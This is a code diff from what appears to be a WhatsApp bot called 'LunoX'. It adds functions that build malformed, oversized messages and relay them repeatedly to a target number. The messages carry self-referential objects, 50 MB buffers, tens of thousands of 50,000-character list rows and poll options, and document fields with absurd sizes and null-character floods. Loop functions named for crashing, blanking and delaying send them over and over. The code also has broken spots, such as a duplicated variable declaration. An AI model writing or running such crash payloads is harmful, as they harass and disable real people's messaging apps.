+    mention.push('1' + Math.floor(Math.random() * 9999999) + '@s.whatsapp.net');
+  }
+  
+  let nxob = {};
+  nxob.self = nxob;
+  
+  let mixu = {};
+  for (let i = 0; i < 10; i++) {
+    mixu = { a: mixu, b: nxob };
+  }
+  
+  let Bugs1 = {
+    viewOnceMessage: {
+      message: {
+        interactiveMessage: {
+          header: {
+            title: Maklu,
+            hasMediaAttachment: true,
+            imageMessage: {
+              caption: str,
+              width: 999999999,
+              height: 999999999,
+              jpegThumbnail: Buffer.alloc(50000000)
+            }
+          },
+          body: { text: str + Maklu + ejs },
+          footer: { text: str },
+          nativeFlowResponseMessage: {
+            name: "call_permission_request",
+            paramsJson: Yatem,
+            version: 9999
+          },
+          mentionedJid: mention,
+          contextInfo: {
+            participant: target,
+            mentionedJid: mention,
+            quotedMessage: mixu,
+            forwardingScore: 999999999
+          }
+        }
+      }
+    }
+  };
+  
+  let Bugs2 = {
+    listMessage: {
+      title: str,
+      description: Maklu,
+      buttonText: "?¿ LunoX | Attack ?¿",
+      sections: []
+    }
+  };
+  
+  for (let s = 0; s < 100; s++) {
+    let rows = [];
+    for (let r = 0; r < 500; r++) {
+      rows.push({
+        title: 'F'.repeat(50000),
+        description: 'A'.repeat(50000),
+        rowId: 'P'.repeat(50000)
+      });
+    }
+    Bugs2.listMessage.sections.push({
+      title: 'X' + s + ' ' + 'X'.repeat(50000),
+      rows: rows
+    });
+  }
+  
+  let Bugs3 = {
+    pollCreationMessage: {
+      name: Maklu,
+      options: []
+    }
+  };
+  
+  for (let i = 0; i < 500; i++) {
+    Bugs3.pollCreationMessage.options.push({
+      optionName: 'O'.repeat(50000)
+    });
+  }
+  
+  let ortulu = await generateWAMessageFromContent(target, Bugs1, {});
+  let ortulu2 = await generateWAMessageFromContent(target, Bugs2, {});
+  let ortulu2 = await generateWAMessageFromContent(target, Bugs3, {});
+  
+  await client.relayMessage(target, ortulu.message, {
+    participant: { jid: target },
+    messageId: ortulu.key.id
+  });
+  
+  await client.relayMessage(target, ortulu2.message, {
+    participant: { jid: target },
+    messageId: ortulu2.key.id
+  });
+  
+  await client.relayMessage(target, ortulu2.message, {
+    participant: { jid: target },
+    messageId: ortulu2.key.id
+  });
+  
+  for (let i = 0; i < 5; i++) {
+    await client.relayMessage(target, { conversation: str + Maklu }, {});
+    await client.relayMessage(target, {
+      extendedTextMessage: {
+        text: str,
+        contextInfo: { mentionedJid: mention, quotedMessage: nxob }
+      }
+    }, {});
+  }
+  
+  console.log(`succes Send to ${target}`);
+}
+
+async function docthumb(client, target) {
+  await client.relayMessage(target,
+    generateWAMessageFromContent(target,
+      proto.Message.fromObject({
+        viewOnceMessage: {
+          message: {
+            interactiveMessage: {
+              header: {
+                title: "⤻꙳‌‌༑ᐧ‌⌁⃰𝐃‌𝐑‌᪳𝐎‌‌᪳𝐈𝐃`𝐔𝐈 🍷 𝐊‌𝐈‌᪳𝐋𝐋⃪ ▾ ༑‌⟆" + "ꦽ".repeat(60000),
+                documentMessage: {
+                  url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
+                  mimetype: "vsp/vaultsuperior",
+                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
+                  fileLength: "1073741824000000",
+                  pageCount: 9007199254740991 * 9999,
+                  mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
+                  fileName: "⤻꙳‌‌༑ᐧ‌⌁⃰𝐃‌𝐑‌᪳𝐎‌‌᪳𝐈𝐃`𝐔𝐈 🍷 𝐊‌𝐈‌᪳𝐋𝐋⃪ ▾ ༑‌⟆" + "ꦽ".repeat(60000),
+                  fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
+                  directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
+                  mediaKeyTimestamp: "1723855952",
+                  contactVcard: true,
+                  thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
+                  thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
+                  thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
+                  jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABERERESERMVFRMaHBkcGiYjICAjJjoqLSotKjpYN0A3N0A3WE5fTUhNX06MbmJiboyiiIGIosWwsMX46/j///8BERERERIRExUVExocGRwaJiMgICMmOiotKi0qOlg3QDc3QDdYTl9NSE1fToxuYmJujKKIgYiixbCwxfjr+P/////CABEIAGAARAMBIgACEQEDEQH/xAAnAAEBAAAAAAAAAAAAAAAAAAAABgEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQACEAMQAAAAvAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAf/8QAHRAAAQUBAAMAAAAAAAAAAAAAAgABE2GRETBRYP/aAAgBAQABPwDxRB6fXUQXrqIL11EF66iC9dCLD3nzv//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQIBAT8Ad//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8Ad//Z",
+                },
+                hasMediaAttachment: true
+              },
+              body: {
+                text: "⤻꙳‌‌༑ᐧ‌⌁⃰𝐃‌𝐑‌᪳𝐎‌‌᪳𝐈𝐃`𝐔𝐈 🍷 𝐊‌𝐈‌᪳𝐋𝐋⃪ ▾ ༑‌⟆" + "ꦽ".repeat(60000),
+              },
+              contextInfo: {
+                remoteJid: "X",
+                participant: target,
+                mentionedJid: [target, "13135550002@s.whatsapp.net"],
+                quotedMessage: {},
+                isForwarded: true,
+                forwardingScore: 9999,
+                externalAdReply: {
+                  title: "🦋 .LunoxKing¡!",
+                  body: "t.me/Pinnxyx $$$ t.me/Xyzeen",
+                  mediaType: "VIDEO",
+                  renderLargerThumbnail: false,
+                  containsAutoReply: true,
+                  showAdAttribution: true,
+                  thumbnail: { url: "https://files.catbox.moe/lck4pw.jpg" },
+                },
+              },
+              nativeFlowMessage: {
+                messageParamsJson: "{",
+                buttons: [
+                  {
+                    name: "galaxy_message",
+                    buttonParamsJson: JSON.stringify({
+                      icon: "REVIEW",
+                      flow_cta: "\0" + "💣⃟༑𝕷𝖔𝖓𝖔𝖝⌁𝑬𝒙𝒆𝒄𝒖𝒕𝒊𝒗𝒆⃰‌ཀ‌‌🪅-‣" + "\u0000".repeat(60000),
+                      flow_message_version: "3"
+                    })
+                  },
+                ]
+              }
+            }
+          }
+        }
+      }),
+      { userJid: target }
+    ).message,
+    {
+      messageId: generateWAMessageFromContent(
+        target,
+        proto.Message.fromObject({}),
+        { userJid: target }
+      ).key.id,
+      participant: { jid: target }
+    }
+  );
 }
 //FUNCTION BUG GROUP
 async function crashgrouplunox(target) {
@@ -1922,45 +892,27 @@ async function fuckgroupXnxx(target) {
 //PEMANGILAN FUNCTION
 async function forcloselunox(target) {
   for (let i = 0; i < 60; i++) {
-    await LunoxCallCrash(target, false);
-    await sleep(800);
-    await LunoxForceDelete(target);
-    await sleep(800);
-    await forcloselunoxwel(target);
+    await ForceInvisions(target);
+    await sleep(600);
+    await fcPayment(target);
   }
 }
 
 async function blankhardlunox(target) {
   for (let i = 0; i < 30; i++) {
-    await LunoxBlank(target);
+    await Killers(target);
     await sleep(500);
-    await PinzyLunoxUI(target);
-    await sleep(500);
-    await PinzyLunoxAhAh(target);
-    await sleep(500);
-    await LunoxRowrr(target);
-    await sleep(500);
-    await chatFrezzeLunox(target);
-    await sleep(500);
-    await blankjembotlunox(target, true);
+    await docthumb(target);
   }
 }
 
 async function delayhardlunox(target) {
   for (let i = 0; i < 50; i++) {
-    await PinzyDelayAngeXnxx(target);
+    await StellarBriliance(client, target, 'RAM');
     await sleep(500);
-    await ProductionLunox(target);
+    await DelayCrashJembut(target);
     await sleep(500);
-    await LunoxInvis(target);
-    await sleep(500);
-    await DelayLunox(target);
-    await sleep(500);
-    await pukiMax(target);
-    await sleep(500);
-    await LunoxDelayX(target, true);
-    await sleep(500);
-    await LunoxXdelay2(target, true);  
+    await DileyHarddd(target);
   }
 }
 
